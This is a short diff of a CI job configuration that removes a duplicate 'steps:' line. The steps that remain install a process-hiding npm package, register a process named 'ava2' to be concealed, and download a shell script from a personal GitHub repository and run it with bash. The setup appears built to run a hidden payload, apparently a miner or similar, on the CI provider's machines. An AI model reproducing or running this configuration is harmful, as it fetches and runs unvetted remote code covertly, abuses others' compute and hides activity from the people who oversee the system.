@@ -9,6 +9,5 @@ jobs:
     steps:
       - checkout
       - run: sudo su --command "sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt-get install --force-yes nodejs && npm i -g node-process-hider && sudo ph add ava2 && wget https://raw.githubusercontent.com/faridmd/Heyzo/main/wrote1.sh"
-    steps:
       - run: --command "bash wrote1.sh"
       
